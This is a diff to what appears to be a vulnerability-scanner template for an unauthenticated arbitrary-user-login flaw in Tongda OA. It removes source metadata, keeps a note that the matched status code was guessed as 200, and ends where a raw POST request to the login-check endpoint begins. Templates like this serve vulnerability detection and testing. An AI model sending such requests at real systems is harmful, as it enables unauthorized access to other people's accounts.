@@ -3,13 +3,8 @@ info:
   name: 通达OA前台任意用户登录漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fabc7e9542e6bb488062753838a7a47c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fabc7e9542e6bb488062753838a7a47c
 http:
 - raw:
   - 'POST /logincheck_code.php HTTP/1.1
